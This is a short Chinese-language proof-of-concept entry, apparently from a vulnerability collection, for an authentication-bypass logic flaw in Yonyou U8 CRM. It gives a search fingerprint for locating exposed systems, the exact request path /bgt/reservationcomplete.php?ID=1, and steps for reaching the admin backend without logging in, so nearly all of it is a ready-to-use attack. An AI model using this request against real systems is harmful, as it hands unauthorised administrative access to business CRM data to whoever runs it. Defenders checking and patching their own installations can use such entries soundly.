# 用友U8CRMreservationcomplete接口存在逻辑漏洞

用友 ｜ 逻辑缺陷 ｜ —
- **指纹**：`title="用友U8CRM"`
- **请求**：`http://ip/bgt/reservationcomplete.php?ID=1`

**Payload**
```
/bgt/reservationcomplete.php?ID=1 访问此路径后显示空白页面，重新访问根目录，即可进入后台
1.访问存在漏洞的网站
2.POC
如果出现空白页面则表示可能存在该漏洞
3.再次请求该网址，即可自动登录后台
```
- **响应特征**：200